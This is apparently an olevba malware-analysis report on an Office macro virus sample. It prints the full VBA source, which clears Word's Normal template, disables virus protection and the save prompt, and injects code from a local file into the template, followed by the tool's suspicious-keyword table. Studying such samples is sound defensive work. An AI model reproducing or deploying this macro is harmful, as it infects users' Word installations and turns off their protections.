olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Suite-faf7e6b7a61aa070df1f3169d454d04a08a2d5ea
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Suite-faf7e6b7a61aa070df1f3169d454d04a08a2d5ea 
in file: Virus.MSOffice.Suite-faf7e6b7a61aa070df1f3169d454d04a08a2d5ea - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Call BulletLoader
Sub Bulletloader()
On Error Resume Next
Set wo = CreateObject("word.application")
wo.NormalTemplate.VBProject.VBComponents(1).codemodule.deletelines 1,wo.NormalTemplate.VBProject.VBComponents(1).codemodule.countoflines
wo.Options.VirusProtection = (Rnd * 0)
wo.Options.SaveNormalPrompt = (Rnd * 0)
wo.NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.AddFromFile "c:\expo.exp"
wo.NormalTemplate.Save
wo.Quit
 
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

